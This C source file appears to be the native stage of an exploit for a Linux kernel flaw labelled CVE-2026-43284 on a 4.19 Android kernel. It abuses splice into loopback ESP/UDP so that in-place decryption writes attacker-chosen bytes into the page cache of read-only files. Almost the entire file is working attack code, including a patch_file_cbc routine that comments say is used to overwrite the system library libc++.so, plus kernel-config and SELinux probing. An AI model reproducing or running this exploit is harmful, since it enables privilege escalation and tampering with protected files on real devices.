/*
 * DFProbe native stage — CVE-2026-43284 (DirtyFrag) single-block page-cache write,
 * adapted for Linux 4.19 (vivo V2029, 4.19.136-perf+).
 *
 * Packet layout (same as DFRoot):  ESP: SPI(4) + Seq(4) + IV(16) + ciphertext(16) = 40B
 * The 16 "ciphertext" bytes are the page-cache content of the victim file, planted
 * into the skb frag via splice(pipe -> connected UDP socket).
 *
 * On 4.19 this crosses:
 *   splice() -> generic_splice_sendpage() -> sock_sendpage -> udp_sendpage()
 *   -> ip_append_page() -> skb_append_pagefrags()        [frag = victim page]
 * loopback RX:
 *   udp_rcv -> xfrm4_udp_encap_rcv -> xfrm_input -> esp_input()
 *   -> "skip_cow" branch (vulnerable; verified present in v4.19 esp4.c)
 *   -> crypto_aead_decrypt() in place over the frag      [page cache write]
 *
 * This probe only ever writes to the app's own private file.
 */
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>
#include <linux/version.h>
#include <zlib.h>
#include <sys/utsname.h>
#include <arpa/inet.h>

#include "aes256.h"

int hook_main(int argc, char **argv);

#define OFF1 0x0100
#define OFF2 0x1100

static uint8_t g_aes_key[32];

/* shared with hook.c (stage-2) */
uint32_t    g_spi;
int         g_encap_port, g_sender_port;

static void compute_iv(const uint8_t old[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

static int tx_socket(int encap_port, int sender_port) {
    int sk = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk < 0) { printf("socket: %s\n", strerror(errno)); return -1; }
    struct sockaddr_in src = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)sender_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    int opt = 1;
    setsockopt(sk, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    if (bind(sk, (struct sockaddr *)&src, sizeof(src)) < 0) {
        printf("bind %d: %s\n", sender_port, strerror(errno)); close(sk); return -1;
    }
    struct sockaddr_in dst = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)encap_port),
        .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(sk, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        printf("connect: %s\n", strerror(errno)); close(sk); return -1;
    }
    return sk;
}

/* One 16-byte CBC write. Returns 0 on success (splice chain) */
static int one_write(int sk, int pipe_rd, int pipe_wr, int file_fd,
                     off_t offset, uint32_t spi, const uint8_t iv[16]) {
    static uint32_t seq = 1;
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(spi);
    *(uint32_t *)(hdr + 4) = htonl(seq++);
    memcpy(hdr + 8, iv, 16);

    struct iovec iov = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pipe_wr, &iov, 1, SPLICE_F_GIFT) != 24) {
        printf("vmsplice hdr: %s\n", strerror(errno));
        return -1;
    }
    off_t off = offset;
    if (splice(file_fd, &off, pipe_wr, NULL, 16, SPLICE_F_MOVE) != 16) {
        printf("splice file->pipe: %s\n", strerror(errno));
        return -1;
    }
    ssize_t s = splice(pipe_rd, NULL, sk, NULL, 40, 0);
    if (s != 40) {
        printf("splice pipe->udp: %zd rc=%d(%s)\n", s, errno, strerror(errno));
        return -1;
    }
    return 0;
}

/* Patch `len` bytes (must be a 16-multiple) into `path` at file offset `foff`
 * — DFRoot's patch_file_cbc, re-factored onto this file's one_write(). Stage-2
 * hook.c uses it for libc++.so; stage-1 uses it implicitly for its 2 blocks. */
int patch_file_cbc(const char *path, const char *payload, size_t len,
                   size_t foff, int use_helper) {
    (void)use_helper; /* system files: pread-based read, no crash_dump bridge */
    if (len % 16 != 0) { printf("patch_file_cbc: len %zu not 16-multiple\n", len); return -1; }

    int sk = tx_socket(g_encap_port, g_sender_port);
    if (sk < 0) return -1;
    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) {
        printf("patch_file_cbc: open %s: %s\n", path, strerror(errno));
        close(sk); return -1;
    }
    int pfd[2];
    if (pipe(pfd) < 0) {
        printf("patch_file_cbc: pipe: %s\n", strerror(errno));
        close(file_fd); close(sk); return -1;
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old[16];
        if (pread(file_fd, old, 16, off) != 16) {
            printf("patch_file_cbc: pread 0x%lx: %s\n", (long)off, strerror(errno));
            rc = -1; break;
        }
        uint8_t iv[16];
        compute_iv(old, (const uint8_t *)payload + i * 16, iv);
        if (one_write(sk, pfd[0], pfd[1], file_fd, off, g_spi, iv)) {
            rc = -1; break;
        }
        usleep(150000);
    }
    close(pfd[0]); close(pfd[1]); close(file_fd); close(sk);
    return rc;
}

static unsigned long xfrm_err(const char *key) {
    FILE *f = fopen("/proc/net/xfrm_stat", "r");
    if (!f) return (unsigned long)-1;
    char line[64]; unsigned long v = 0;
    while (fgets(line, sizeof(line), f))
        if (!strncmp(line, key, strlen(key))) {
            char *p = line + strlen(key);
            while (*p == ' ' || *p == '\t') p++;
            v = strtoul(p, NULL, 0);
        }
    fclose(f);
    return v;
}

/* Exact-match lookup in compressed /proc/config.gz.
 * Returns: 1 (y/m), 0 (not set or absent), -1 + *unavailable=1 (file unreadable) */
static int config_has(const char *cfg, int *unavailable) {
    *unavailable = 0;
    gzFile gz = gzopen("/proc/config.gz", "rb");
    if (!gz) { *unavailable = 1; return -1; }
    size_t n = strlen(cfg);
    char line[256];
    while (gzgets(gz, line, sizeof(line))) {
        if (!strncmp(line, cfg, n) && line[n] == '=') {
            /* CONFIG_X=y / =m -> enabled, =n -> disabled */
            gzclose(gz);
            return line[n + 1] == 'n' ? 0 : 1;
        }
        /* "# CONFIG_X is not set" */
        if (!strncmp(line, "# ", 2) && !strncmp(line + 2, cfg, n) &&
            !strncmp(line + 2 + n, " is not set", 11)) {
            gzclose(gz);
            return 0;
        }
    }
    gzclose(gz);
    return 0;
}

static void env_report(void) {
    struct utsname u = {0};
    if (uname(&u) == 0)
        printf("ENV uname: %s %s %s %s\n", u.sysname, u.release, u.version, u.machine);
    const char *cfgs[] = {"CONFIG_INET_ESP", "CONFIG_XFRM", "CONFIG_CRYPTO_AUTHENC",
                          "CONFIG_CRYPTO_CBC", "CONFIG_CRYPTO_AES", "CONFIG_MODULES",
                          "CONFIG_MODULE_SIG_FORCE", "CONFIG_MODVERSIONS", "CONFIG_KPROBES"};
    int unavail = 0;
    for (size_t i = 0; i < sizeof(cfgs)/sizeof(cfgs[0]); i++) {
        int v = config_has(cfgs[i], &unavail);
        printf("ENV config %s: %s\n", cfgs[i],
               unavail ? "UNAVAILABLE (/proc/config.gz unreadable)" :
               v > 0 ? "y/m (compiled in)" : "not set");
    }
    printf("ENV selinux_enforce: ");
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd < 0) printf("unreadable (%s)\n", strerror(errno));
    else { char b[8] = {0}; ssize_t n = read(fd, b, sizeof(b) - 1); close(fd);
           printf("%s", n > 0 ? b : "?"); }
    printf("\n");
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    int file_fd = -1;
    unsigned long spi = 0;
    const char *path = NULL;
    int have_encap = 0, have_sender = 0, have_spi = 0, have_file = 0;

    /* stage-2 tokens parsed by hook.c itself (its own --hook-* namespace) */
    const char *hook_mode = NULL;
    for (int i = 1; i < argc; i++)
        if (!strcmp(argv[i], "--hook-mode") && i + 1 < argc) hook_mode = argv[i + 1];

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--encap-port") && i + 1 < argc) { g_encap_port = atoi(argv[++i]); have_encap = 1; }
        else if (!strcmp(argv[i], "--sender-port") && i + 1 < argc) { g_sender_port = atoi(argv[++i]); have_sender = 1; }
        else if (!strcmp(argv[i], "--spi") && i + 1 < argc) { spi = strtoul(argv[++i], NULL, 0); have_spi = 1; }
        else if (!strcmp(argv[i], "--file") && i + 1 < argc) { path = argv[++i]; have_file = 1; }
        else if (!strcmp(argv[i], "--aes-key") && i + 1 < argc) {
            const char *h = argv[++i];
            if (strlen(h) != 64) { printf("bad aes key length\n"); return 2; }
            for (int j = 0; j < 32; j++) {
                unsigned int b; if (sscanf(h + 2 * j, "%2x", &b) != 1) { printf("bad key\n"); return 2; }
                g_aes_key[j] = (uint8_t)b;
            }
        } else if (strstr(argv[i], "--hook-") == argv[i] && i + 1 < argc) { i++; }
        else { printf("usage: %s [--encap-port N --sender-port N --spi N --aes-key HEX] [--file P] [--hook-mode M ...]\n", argv[0]); return 2; }
    }
    g_spi = (uint32_t)spi;

    /* stage-2 dispatch: hook mode runs its own CLI contract
     * (status/patch/unpatch/trigger/full) */
    if (hook_mode) {
        return hook_main(argc, argv);
    }

    if (!have_encap || !have_sender || !have_spi || !have_file) { printf("missing args\n"); return 2; }
    int encap_port = g_encap_port, sender_port = g_sender_port;
    (void)spi;

    env_report();

    file_fd = open(path, O_RDONLY);
    if (file_fd < 0) { printf("open probe file: %s\n", strerror(errno)); return 1; }
    printf("TEST file: %s\n", path);

    long pre = xfrm_err("XfrmInStateProtoError"), pre2 = xfrm_err("XfrmInNoStates");
    printf("XFRM before: ProtoError=%ld NoStates=%ld\n", pre, pre2);

    /* Mirror DFRoot: one socket and one pipe reused across all writes. */
    int sk = tx_socket(encap_port, sender_port);
    if (sk < 0) return 1;
    int pfd[2];
    if (pipe(pfd) < 0) { printf("pipe: %s\n", strerror(errno)); close(sk); return 1; }

    int ok = 0, off[2] = { OFF1, OFF2 };
    for (int t = 0; t < 2; t++) {
        uint8_t old[16], want[16], got[16];
        char tag[16];
        snprintf(tag, sizeof(tag), "DFP-OK-BLK%d", t);

        if (pread(file_fd, old, 16, off[t]) != 16) { printf("pread: %s\n", strerror(errno)); break; }
        memcpy(want, tag, strlen(tag)); memset(want + strlen(tag), 'X', 16 - strlen(tag));

        uint8_t iv[16];
        compute_iv(old, want, iv);

        printf("TEST%d off=0x%x old=", t, off[t]);
        for (int i = 0; i < 16; i++) printf("%02x", old[i]);
        printf(" -> ");
        for (int i = 0; i < 16; i++) printf("%02x", want[i]);
        printf("\n");

        int rc = one_write(sk, pfd[0], pfd[1], file_fd, off[t], (uint32_t)spi, iv);
        if (rc) break;

        usleep(200000); /* let loopback rx + crypto run */

        int vfd = open(path, O_RDONLY);              /* fresh fd → page cache read */
        ssize_t n = vfd >= 0 ? pread(vfd, got, 16, off[t]) : -1;
        if (vfd >= 0) close(vfd);
        if (n != 16) { printf("readback failed: %s\n", strerror(errno)); break; }

        printf("TEST%d got =", t);
        for (int i = 0; i < 16; i++) printf("%02x", got[i]);
        printf(" %s\n", memcmp(got, want, 16) == 0 ? "WRITE LANDED" : "unchanged");

        if (memcmp(got, want, 16) == 0) { ok++; if (t == 1) break; }
    }

    long post = xfrm_err("XfrmInStateProtoError"), post2 = xfrm_err("XfrmInNoStates");
    printf("XFRM after: ProtoError=%ld (delta %ld) NoStates=%ld (delta %ld)\n",
           post, post - pre, post2, post2 - pre2);

    if (ok == 2) printf("RESULT: SUCCESS — CVE-2026-43284 page-cache write WORKS on this kernel\n");
    else if (ok == 1) printf("RESULT: PARTIAL — write landed once (retry loop recommended)\n");
    else printf("RESULT: FAILED — primitive not observed (check XFRM deltas above)\n");

    close(pfd[0]); close(pfd[1]); close(sk);
    close(file_fd);
    return ok == 2 ? 0 : 1;
}
